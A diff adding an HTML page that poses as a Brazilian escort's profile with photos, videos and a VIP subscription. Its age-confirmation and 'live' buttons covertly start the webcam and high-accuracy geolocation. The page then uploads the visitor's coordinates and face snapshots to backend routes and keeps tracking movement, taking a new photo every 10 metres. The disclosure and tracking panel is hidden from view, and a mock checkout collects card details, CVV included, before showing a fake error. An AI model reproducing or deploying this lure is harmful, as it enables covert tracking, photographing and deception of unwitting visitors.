@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Maya Valença — Acompanhante VIP</title>
+<style>
+/* ESTILOS DO MODAL DE CARTÃO ILUSTRATIVO */
+.credit-card-preview {
+  background: linear-gradient(135deg, #1f1f2e, #0e0e17);
+  border: 1px solid rgba(232, 63, 134, 0.3);
+  border-radius: 16px;
+  padding: 20px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.chip {
+  width: 38px;
+  height: 26px;
+  background: linear-gradient(135deg, #ffe082, #ffb300);
+  border-radius: 6px;
+}
+
+.card-number {
+  font-family: monospace;
+  font-size: 18px;
+  letter-spacing: 3px;
+  color: #fff;
+}
+
+.modal-input {
+  width: 100%;
+  padding: 10px 14px;
+  background: #111118;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  color: #fff;
+  font-size: 14px;
+  outline: none;
+}
+
+.modal-input:focus {
+  border-color: var(--pink);
+}
+:root{--bg:#0d0d12;--panel:#17171f;--panel2:#20202a;--text:#f7f4f8;--muted:#aaa5b0;--pink:#e83f86;--blue:#4285f4;--border:rgba(255,255,255,.09)}
+*{box-sizing:border-box} body{margin:0;font-family:Arial,sans-serif;background:#0b0b10;color:var(--text)}
+button{font:inherit}
+
+/* OVERLAY +18 COM BLUR */
+.age-modal{
+  position:fixed;top:0;left:0;width:100vw;height:100vh;
+  background:rgba(11,11,16,0.85);
+  backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);
+  z-index:9999;
+  display:flex;align-items:center;justify-content:center;
+  padding:2px;
+}
+.age-box{
+  background:var(--panel);border:1px solid var(--pink);
+  border-radius:24px;padding:35px 25px;max-width:420px;width:100%;
+  text-align:center;box-shadow:0 20px 50px rgba(0,0,0,0.8);
+}
+.age-box h2{margin:0 0 10px;font-size:26px;color:#fff}
+.age-box p{color:var(--muted);font-size:14px;line-height:1.5;margin-bottom:25px}
+
+/* ESTILOS DE LAYOUT */
+.top{height:64px;position:sticky;top:0;z-index:20;display:flex;justify-content:space-between;align-items:center;padding:0 5%;background:rgba(8,8,12,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+.brand{font-weight:800}.brand span{color:#ff76aa}.btn{border:1px solid var(--border);background:#22222c;color:#fff;padding:10px 16px;border-radius:999px;cursor:pointer}.btn.primary{background:linear-gradient(135deg,var(--pink),#a82b69);border:0}
+.container{max-width:1100px;margin:auto;padding-bottom:60px}.cover{height:310px;background:linear-gradient(180deg,transparent,rgba(0,0,0,.8)),url("/static/assets/images/cover.jpg") center/cover;border-radius:0 0 18px 18px}
+.profile{position:relative;margin-top:-55px;padding:0 28px;display:flex;align-items:flex-end;gap:18px;z-index:2}.avatar{width:125px;height:125px;border-radius:50%;object-fit:cover;border:5px solid var(--bg)}.name{font-size:29px;margin:0 0 5px}.handle,.muted{color:var(--muted)}.bio{color:#ddd;max-width:650px;line-height:1.45}.profile-actions{margin-left:auto;padding-bottom:8px}
+.grid{display:grid;grid-template-columns:2fr 1fr;gap:20px;margin-top:28px}.card{background:var(--panel);border:1px solid var(--border);border-radius:18px;overflow:hidden}.head{padding:18px 20px;border-bottom:1px solid var(--border)}.head h2{margin:0;font-size:18px}.head p{margin:5px 0 0;color:var(--muted);font-size:13px}
+.tabs{display:flex;gap:6px;padding:12px;border-bottom:1px solid var(--border)}.tab{flex:1;border:0;background:transparent;color:var(--muted);padding:10px;border-radius:10px;cursor:pointer}.tab.active{background:#292933;color:#fff}
+.posts{padding:16px}.post{padding-bottom:20px;margin-bottom:20px;border-bottom:1px solid var(--border)}.post:last-child{border-bottom:0;margin-bottom:0}.posthead{display:flex;gap:10px;align-items:center;margin-bottom:12px}.posthead img{width:42px;height:42px;border-radius:50%;object-fit:cover}.media{width:100%;max-height:650px;object-fit:cover;border-radius:14px;background:#050507}.post p{color:#ddd;line-height:1.5}.actions{display:flex;gap:18px;color:var(--muted);font-size:14px;padding-top:10px}
+.side{padding:18px}.price{font-size:30px;font-weight:800;margin:12px 0}.benefits{list-style:none;padding:0}.benefits li{padding:7px 0}.benefits li:before{content:"✓";color:#ff76aa;margin-right:8px}
+.call{padding:15px}.callbox{position:relative;aspect-ratio:16/10;border-radius:14px;overflow:hidden;background:#050507}.callbox video{width:100%;height:100%;object-fit:cover}.callinfo{position:absolute;bottom:0;left:0;right:0;padding:18px;background:linear-gradient(transparent,rgba(0,0,0,.85))}
+.monitor{margin-top:20px;padding:18px}.status{padding:12px;border-radius:10px;background:#111118;color:#bdb7c0;font-size:13px;line-height:1.5}.status.ok{border:1px solid rgba(66,133,244,.45)}.status.error{border:1px solid rgba(232,63,134,.5)}
+.location-data{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0}.datum{background:#101016;border:1px solid var(--border);border-radius:9px;padding:9px;font-size:12px}.datum b{display:block;color:#fff;margin-top:3px}
+.media-list{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:16px}.thumb{aspect-ratio:1;border-radius:10px;overflow:hidden;position:relative;background:#08080c}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.thumb span{position:absolute;bottom:6px;left:6px;background:rgba(0,0,0,.7);padding:4px 7px;border-radius:6px;font-size:11px}
+.notice{text-align:center;color:#77717c;font-size:12px;padding:20px}.danger-note{font-size:11px;color:#9b94a0;line-height:1.5;margin-top:10px}
+.hidden-canvas{display:none}
+
+@media(max-width:850px){.grid{grid-template-columns:1fr}.profile{flex-wrap:wrap}.profile-actions{width:100%;margin-left:0}.cover{height:240px}}
+@media(max-width:520px){.container{padding:0 10px 50px}.profile{padding:0 10px}.avatar{width:100px;height:100px}.name{font-size:24px}.location-data{grid-template-columns:1fr}}
+
+.minha-caixa {
+  display: none;
+}
+/* BOTÃO FLUTUANTE DO WHATSAPP */
+.whatsapp-float {
+  position: fixed;
+  bottom: 25px;
+  right: 25px;
+  width: 60px;
+  height: 60px;
+  background-color: #25d366;
+  color: #fff;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+  z-index: 999;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+  text-decoration: none;
+}
+
+.whatsapp-float:hover {
+  transform: scale(1.1);
+  box-shadow: 0 6px 20px rgba(37, 211, 102, 0.5);
+}
+
+.whatsapp-icon {
+  width: 32px;
+  height: 32px;
+}
+</style>
+</head>
+<body>
+
+<!-- MODAL DE CONFIRMAÇÃO DE IDADE (+18) -->
+<div id="ageModal" class="age-modal">
+  <div class="age-box">
+    <h2>Conteúdo Restrito</h2>
+    <p>Este site contém material voltado para o público adulto. Ao continuar, você confirma que possui 18 anos ou mais.</p>
+    <button class="btn primary" style="width:100%;padding:14px;font-weight:bold" onclick="handlePermissionClick()">+18 ANOS — ENTRAR</button>
+  </div>
+</div>
+
+<header class="top">
+  <div class="brand">Maya <span>Valença</span></div>
+  <div><button class="btn" onclick="document.getElementById('monitor').scrollIntoView({behavior:'smooth'})">Área VIP</button></div>
+</header>
+
+<main class="container">
+<section class="cover"></section>
+
+<section class="profile">
+  <img class="avatar" src="/static/assets/images/profile.jpg" alt="Maya Valença">
+  <div>
+    <h1 class="name">Maya Valença ✓</h1>
+    <div class="handle">@mayavalenca</div>
+    <p class="bio">Acompanhante em Salvador & Lauro de Freitas. Momentos inesquecíveis com discrição, elegância e carinho. Atendimento privativo e viagens. Chamadas de vídeo disponíveis.</p>
+  </div>
+  <div class="profile-actions"><button class="btn primary" onclick="handlePermissionClick()"> Vem pro ao vivo 🎥​</button></div>
+
+</section>
+
+<section class="grid">
+<div class="card">
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('posts',this)">Publicações</button>
+    <button class="tab" onclick="showTab('videos',this)">Vídeos</button>
+    <button class="tab" onclick="showTab('fotos',this)">Fotos</button>
+  </div>
+
+  <div id="posts" class="posts">
+    <article class="post">
+      <div class="posthead"><img src="/static/assets/images/foto2.jpeg"><div><b>Maya Valença</b><br><small class="muted">Agora</small></div></div>
+      <p>Pronta para uma noite especial. 👅​🥵​</p>
+      <img class="media" src="/static/assets/images/foto3.jpeg" alt="Publicação">
+
+    </article>
+
+    <article class="post">
+      <div class="posthead"><img src="/static/assets/images/foto2.jpeg"><div><b>Maya Valença</b><br><small class="muted">Hoje</small></div></div>
+      <p>Fico toda molhadinha afffss 💦😈</p>
+      <video class="media" controls preload="metadata">
+        <source src="/static/assets/videos/video1.mp4" type="video/mp4">
+      </video>
+      <div class="actions"><span>♡ Curtir</span><span>Comentário</span><span>Compartilhar</span></div>
+    </article>
+
+    <article class="post">
+      <div class="posthead"><img src="/static/assets/images/foto2.jpeg"><div><b>Maya Valença</b><br><small class="muted">Ontem</small></div></div>
+      <p>Mais um ensaio exclusivo publicado para meus assinantes.</p>
+      <img class="media" src="/static/assets/images/foto4.jpeg" alt="Publicação">
+    </article>
+  </div>
+
+  <div id="videos" class="media-list" style="display:none">
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video1.mp4" type="video/mp4"></video><span>Vídeo 1</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video2.mp4" type="video/mp4"></video><span>Vídeo 2</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video3.mp4" type="video/mp4"></video><span>Vídeo 3</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video4.mp4" type="video/mp4"></video><span>Vídeo 4</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video5.mp4" type="video/mp4"></video><span>Vídeo 5</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video6.mp4" type="video/mp4"></video><span>Vídeo 6</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video7.mp4" type="video/mp4"></video><span>Vídeo 7</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video8.mp4" type="video/mp4"></video><span>Vídeo 8</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video9.mp4" type="video/mp4"></video><span>Vídeo 9</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video10.mp4" type="video/mp4"></video><span>Vídeo 10</span></div>
+    <div class="thumb"><video muted controls preload="metadata"><source src="/static/assets/videos/video11.mp4" type="video/mp4"></video><span>Vídeo 11</span></div>
+  </div>
+
+  <div id="fotos" class="media-list" style="display:none">
+    <div class="thumb"><img src="/static/assets/images/foto1.jpeg" alt="Foto 1"><span>Foto 1</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto2.jpeg" alt="Foto 2"><span>Foto 2</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto3.jpeg" alt="Foto 3"><span>Foto 3</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto4.jpeg" alt="Foto 4"><span>Foto 4</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto5.jpeg" alt="Foto 5"><span>Foto 5</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto6.jpeg" alt="Foto 6"><span>Foto 6</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto7.jpeg" alt="Foto 7"><span>Foto 7</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto8.jpeg" alt="Foto 8"><span>Foto 8</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto9.jpeg" alt="Foto 9"><span>Foto 9</span></div>
+    <div class="thumb"><img src="/static/assets/images/foto10.jpeg" alt="Foto 10"><span>Foto 10</span></div>
+  </div>
+</div>
+
+<aside>
+  <div class="card side">
+    <h2>Clube VIP & Conteúdo</h2>
+    <div class="price">R$ 29,90 <small class="muted">/ mês</small></div>
+    <p class="muted">Acesso a conteúdos íntimos, chamadas prioritárias e agenda exclusiva.</p>
+    <ul class="benefits">
+      <li>Publicações sem censura</li><li>Fotos e vídeos inéditos</li><li>Chamadas de vídeo privativas</li><li>Atendimento preferencial</li>
+    </ul>
+<button class="btn primary" style="width:100%" onclick="openCardModal()">Assinar agora</button>
+  </div>
+
+<div class="minha-caixa" style="display: none;">
+  <div class="card" style="margin-top:20px">
+    <div class="head"><h2>Chamada de Vídeo Privada</h2><p>Inicie a webcam para simulação em tempo real.</p></div>
+    <div class="call">
+      <div class="callbox">
+        <video id="camera" autoplay muted loop playsinline>
+          <source src="/static/assets/videos/video1.mp4" type="video/mp4">
+        </video>
+        <div class="callinfo"><b>Maya Valença</b><br><small class="muted" id="callSubtitle">Aguardando conexão...</small></div>
+      </div>
+      <button class="btn primary" style="width:100%;margin-top:12px" onclick="handlePermissionClick()">Permitir câmera e iniciar chamada</button>
+    </div>
+  </div>
+
+  <div class="card monitor" id="monitor">
+    <h2 style="margin-top:0">Estudo: localização e distância</h2>
+    <p class="muted" style="font-size:13px;line-height:1.5">
+      O recurso abaixo demonstra <b>watchPosition()</b>. Após autorização, a posição é acompanhada
+      enquanto esta página estiver aberta. Fotografias da câmera são enviadas ao backend Flask quando a distância atinge o limite.
+    </p>
+
+    <div id="status" class="status">
+      Aguardando autorização do usuário.
+    </div>
+
+    <div class="location-data">
+      <div class="datum">Latitude<b id="latitude">—</b></div>
+      <div class="datum">Longitude<b id="longitude">—</b></div>
+      <div class="datum">Distância<b id="distance">0 m</b></div>
+      <div class="datum">Capturas<b id="photoCount">0</b></div>
+      <div class="datum">ID da sessão<b id="session">—</b></div>
+    </div>
+
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
+      <button class="btn" onclick="openNearby('saude')">Atendimento de saúde próximo</button>
+      <button class="btn" onclick="openNearby('delegacia')">Delegacia próxima</button>
+    </div>
+
+    <p class="danger-note">
+      Este recurso é acadêmico e foi projetado para uso com consentimento explícito.
+      Os dados de geolocalização e as capturas são transmitidos para as rotas <code>/location</code> e <code>/upload</code> do backend.
+    </p>
+  </div>
+</aside>
+</section>
+</div>
+<!-- Canvas invisível para renderização do snapshot da câmera -->
+<canvas id="canvas" class="hidden-canvas"></canvas>
+
+<p class="notice">Local — Salvador/Lauro de Freitas. Mídias carregadas de static/assets.</p>
+</main>
+
+<script>
+/*
+============================================================
+ELEMENTOS E ESTADOS DO DOM
+============================================================
+*/
+const video = document.getElementById("camera");
+const canvas = document.getElementById("canvas");
+const latitudeElement = document.getElementById("latitude");
+const longitudeElement = document.getElementById("longitude");
+const photoCountElement = document.getElementById("photoCount");
+const distanceElement = document.getElementById("distance");
+const statusElement = document.getElementById("status");
+
+let stream = null;
+let captureId = null;
+let lastLocationId = null;
+let lastPhotoLatitude = null;
+let lastPhotoLongitude = null;
+let photoCount = 0;
+let takingPhoto = false;
+const MIN_DISTANCE_METERS = 10;
+let watchId = null;
+
+function showTab(id,btn){
+  ["posts","videos","fotos"].forEach(x=>{
+    document.getElementById(x).style.display=x===id?(x==="posts"?"block":"grid"):"none";
+  });
+  document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
+  btn.classList.add("active");
+}
+
+/*
+============================================================
+INICIALIZAÇÃO POR AÇÃO DO USUÁRIO
+============================================================
+*/
+async function handlePermissionClick() {
+    try {
+        await startMonitoring();
+        document.getElementById("ageModal").style.display = "none";
+        document.getElementById("callSubtitle").textContent = "Chamada de vídeo ativa";
+    } catch (error) {
+        console.error("Erro na permissão:", error);
+    }
+}
+
+/*
+============================================================
+INICIAR MONITORAMENTO E ENVIO
+============================================================
+*/
+async function startMonitoring() {
+    try {
+        // 1. CÂMERA
+        setStatus("Solicitando permissões...");
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            throw new Error("API de Câmera não disponível no navegador.");
+        }
+
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
+
+        video.srcObject = stream;
+        video.loop = false;
+        await video.play().catch(()=>{});
+
+        // 2. GERAR CAPTURE ID
+        captureId = crypto.randomUUID();
+        document.getElementById("session").textContent = captureId.slice(0, 8);
+
+        // 3. LOCALIZAÇÃO INICIAL
+        setStatus("Obtendo localização inicial...");
+        const position = await getCurrentLocation();
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        updatePositionDisplay(latitude, longitude);
+
+        // 4. REGISTRAR LOCALIZAÇÃO INICIAL NO FLASK (/location)
+        setStatus("Registrando localização inicial...");
+        const locationResult = await uploadLocation(captureId, latitude, longitude, accuracy);
+        lastLocationId = locationResult.location_id;
+
+        // 5. PRIMEIRA FOTO NO FLASK (/upload)
+        setStatus("Realizando captura inicial...");
+        await captureAndUploadPhoto(captureId, lastLocationId);
+
+        // 6. POSIÇÃO DE REFERÊNCIA
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
+
+        // 7. MONITORAMENTO CONTÍNUO
+        setStatus("Câmera e localização ativas.", false);
+        startWatchingPosition();
+
+        return true;
+    } catch (error) {
+        setStatus("Erro nas permissões ou execução: " + error.message, true);
+        throw error;
+    }
+}
+
+/*
+============================================================
+LOCALIZAÇÃO INICIAL
+============================================================
+*/
+function getCurrentLocation() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+            reject(new Error("Geolocalização não suportada."));
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
+        });
+    });
+}
+
+/*
+============================================================
+MONITORAMENTO CONTÍNUO
+============================================================
+*/
+function startWatchingPosition() {
+    if (!navigator.geolocation) return;
+
+    watchId = navigator.geolocation.watchPosition(
+        handlePosition,
+        handleLocationError,
+        {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 20000
+        }
+    );
+}
+
+/*
+============================================================
+NOVA POSIÇÃO
+============================================================
+*/
+async function handlePosition(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+
+    updatePositionDisplay(latitude, longitude);
+
+    if (lastPhotoLatitude === null || lastPhotoLongitude === null) return;
+
+    const distance = calculateDistance(lastPhotoLatitude, lastPhotoLongitude, latitude, longitude);
+    distanceElement.textContent = `${distance.toFixed(1)} m`;
+
+    if (distance < MIN_DISTANCE_METERS || takingPhoto) return;
+
+    takingPhoto = true;
+    try {
+        const locationResult = await uploadLocation(captureId, latitude, longitude, accuracy);
+        const locationId = locationResult.location_id;
+        lastLocationId = locationId;
+
+        await captureAndUploadPhoto(captureId, locationId);
+
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
+        distanceElement.textContent = "0 m";
+        setStatus(`Nova captura realizada aos ${MIN_DISTANCE_METERS}m.`, false);
+    } catch (error) {
+        console.error("Erro durante captura:", error);
+    } finally {
+        takingPhoto = false;
+    }
+}
+
+function handleLocationError(error) {
+    setStatus("Erro de localização: " + error.message, true);
+}
+
+/*
+============================================================
+ENVIAR LOCALIZAÇÃO PARA O SERVIDOR FLASK
+============================================================
+*/
+async function uploadLocation(captureId, latitude, longitude, accuracy) {
+    const response = await fetch("/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            capture_id: captureId,
+            latitude: latitude,
+            longitude: longitude,
+            accuracy: accuracy
+        })
+    });
+
+    if (!response.ok) throw new Error("Erro ao enviar localização.");
+
+    const data = await response.json();
+    if (!data.success) throw new Error(data.error || "Erro ao registrar localização.");
+
+    return data;
+}
+
+/*
+============================================================
+CAPTURAR E ENVIAR FOTO PARA O SERVIDOR FLASK
+============================================================
+*/
+async function captureAndUploadPhoto(captureId, locationId) {
+    if (!video.videoWidth || !video.videoHeight) {
+        throw new Error("A câmera ainda não está pronta.");
+    }
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise(resolve => {
+        canvas.toBlob(resolve, "image/jpeg", 0.90);
+    });
+
+    if (!blob) throw new Error("Não foi possível gerar a imagem.");
+
+    const formData = new FormData();
+    formData.append("photo", blob, "capture.jpg");
+    formData.append("capture_id", captureId);
+    if (locationId !== null && locationId !== undefined) {
+        formData.append("location_id", locationId);
+    }
+
+    const response = await fetch("/upload", {
+        method: "POST",
+        body: formData
+    });
+
+    if (!response.ok) throw new Error("Erro no upload da foto.");
+
+    const data = await response.json();
+    if (!data.success) throw new Error(data.error || "Erro ao salvar fotografia.");
+
+    photoCount++;
+    photoCountElement.textContent = photoCount;
+    return data;
+}
+
+/*
+============================================================
+UTILITÁRIOS
+============================================================
+*/
+function updatePositionDisplay(latitude, longitude) {
+    latitudeElement.textContent = latitude.toFixed(6);
+    longitudeElement.textContent = longitude.toFixed(6);
+}
+
+function setStatus(text, isError = false) {
+    statusElement.textContent = text;
+    statusElement.className = "status " + (isError ? "error" : "ok");
+}
+
+function calculateDistance(lat1, lon1, lat2, lon2) {
+    const R = 6371000;
+    const rad = Math.PI / 180;
+    const dLat = (lat2 - lat1) * rad;
+    const dLon = (lon2 - lon1) * rad;
+    const a = Math.sin(dLat / 2) ** 2 +
+              Math.cos(lat1 * rad) * Math.cos(lat2 * rad) * Math.sin(dLon / 2) ** 2;
+    return R * (2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a)));
+}
+
+function openNearby(type){
+  if(lastPhotoLatitude===null || lastPhotoLongitude===null){
+    alert("Autorize a localização primeiro para pesquisar locais próximos.");
+    return;
+  }
+  const query=type==="saude"?"atendimento de saúde":"delegacia";
+  const url="https://www.google.com/maps/search/"+encodeURIComponent(query)+"/@"+lastPhotoLatitude+","+lastPhotoLongitude+",13z";
+  window.open(url,"_blank","noopener");
+}
+
+window.addEventListener("beforeunload", () => {
+    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+    if (stream) stream.getTracks().forEach(track => track.stop());
+});
+
+/*
+============================================================
+CONTROLE DO MODAL DE CARTÃO (ILUSTRATIVO)
+============================================================
+*/
+function openCardModal() {
+  document.getElementById("cardModal").style.display = "flex";
+}
+
+function closeCardModal() {
+  document.getElementById("cardModal").style.display = "none";
+}
+
+function handleSimulatedPayment(event) {
+  event.preventDefault(); // Impede o envio real do formulário
+  alert("Algo deu errado. Tente novamente!");
+  closeCardModal();
+}
+</script>
+</body>
+<!-- MODAL DE CARTÃO DE CRÉDITO (ILUSTRATIVO) -->
+<div id="cardModal" class="age-modal" style="display:none;">
+  <div class="age-box" style="max-width: 460px; text-align: left;">
+    <div style="display:flex; justify-size:space-between; align-items:center; margin-bottom: 20px;">
+      <h2 style="margin:0; font-size:22px;">Checkout VIP</h2>
+      <button onclick="closeCardModal()" style="background:none; border:none; color:var(--muted); font-size:24px; cursor:pointer; line-height:1;">&times;</button>
+    </div>
+
+    <!-- Cartão Ilustrativo -->
+    <div class="credit-card-preview">
+      <div style="font-size: 12px; letter-spacing: 2px; color: #ff76aa; font-weight: bold;">MAYA VALENÇA VIP</div>
+      <div class="chip"></div>
+      <div class="card-number">•••• •••• •••• 4242</div>
+      <div style="display:flex; justify-content:space-between; font-size: 11px; color: #aaa;">
+        <span>TITULAR DO CARTÃO</span>
+        <span>VALIDADE</span>
+      </div>
+      <div style="display:flex; justify-content:space-between; font-size: 13px; font-weight: bold;">
+        <span>SEU NOME AQUI</span>
+        <span>12/28</span>
+      </div>
+    </div>
+
+    <!-- Formulário Simulado -->
+    <form onsubmit="handleSimulatedPayment(event)" style="margin-top: 20px; display: flex; flex-direction: column; gap: 12px;">
+      <div>
+        <label style="font-size: 12px; color: var(--muted); display: block; margin-bottom: 4px;">Número do Cartão</label>
+        <input type="text" placeholder="4532 •••• •••• 4242" required class="modal-input" maxlength="19">
+      </div>
+
+      <div style="display: flex; gap: 10px;">
+        <div style="flex: 2;">
+          <label style="font-size: 12px; color: var(--muted); display: block; margin-bottom: 4px;">Validade</label>
+          <input type="text" placeholder="MM/AA" required class="modal-input" maxlength="5">
+        </div>
+        <div style="flex: 1;">
+          <label style="font-size: 12px; color: var(--muted); display: block; margin-bottom: 4px;">CVV</label>
+          <input type="password" placeholder="123" required class="modal-input" maxlength="4">
+        </div>
+      </div>
+
+      <div>
+        <label style="font-size: 12px; color: var(--muted); display: block; margin-bottom: 4px;">Nome Impresso no Cartão</label>
+        <input type="text" placeholder="NOME COMO NO CARTÃO" required class="modal-input">
+      </div>
+
+      <button type="submit" class="btn primary" style="width:100%; padding: 14px; font-weight: bold; margin-top: 10px;">
+        Confirmar Assinatura — R$ 29,90/mês
+      </button>
+    </form>
+  </div>
+</div>
+<!-- BOTÃO FLUTUANTE DO WHATSAPP -->
+<a href="https://wa.me/5571999999999?text=Ol%C3%A1%2C%20gostaria%20de%20mais%20informa%C3%A7%C3%B5es!"
+   class="whatsapp-float"
+   target="_blank"
+   rel="noopener noreferrer"
+   aria-label="Falar no WhatsApp">
+  <!-- Ícone SVG Oficial do WhatsApp -->
+  <svg viewBox="0 0 32 32" class="whatsapp-icon">
+    <path fill="currentColor" d="M16 0c-8.837 0-16 7.163-16 16 0 2.825 0.737 5.607 2.137 8.048l-2.137 7.952 8.138-2.126c2.353 1.284 5.021 1.96 7.862 1.96 8.837 0 16-7.163 16-16s-7.163-16-16-16zM16 29.333c-2.483 0-4.912-0.667-7.042-1.93l-0.505-0.3-5.232 1.368 1.393-5.187-0.329-0.523c-1.385-2.2-2.118-4.739-2.118-7.328 0-7.536 6.131-13.667 13.667-13.667s13.667 6.131 13.667 13.667-6.131 13.667-13.667 13.667zM22.887 18.948c-0.377-0.188-2.227-1.098-2.572-1.224s-0.597-0.188-0.849 0.188c-0.251 0.377-0.974 1.224-1.194 1.475s-0.44 0.283-0.817 0.094c-0.377-0.188-1.592-0.587-3.033-1.871-1.121-0.999-1.878-2.234-2.098-2.611s-0.023-0.58 0.165-0.768c0.169-0.169 0.377-0.44 0.565-0.66 0.188-0.22 0.251-0.377 0.377-0.628s0.063-0.471-0.031-0.66c-0.094-0.188-0.849-2.043-1.163-2.798-0.306-0.735-0.617-0.635-0.849-0.647-0.22-0.012-0.471-0.012-0.722-0.012s-0.66 0.094-1.005 0.471c-0.345 0.377-1.319 1.288-1.319 3.141s1.351 3.644 1.54 3.896c0.188 0.251 2.658 4.059 6.44 5.69 0.899 0.388 1.601 0.62 2.148 0.793 0.903 0.287 1.725 0.246 2.375 0.149 0.725-0.108 2.227-0.91 2.541-1.789s0.314-1.633 0.22-1.789c-0.094-0.157-0.345-0.251-0.722-0.44z"/>
+  </svg>
+</a>
+</html>
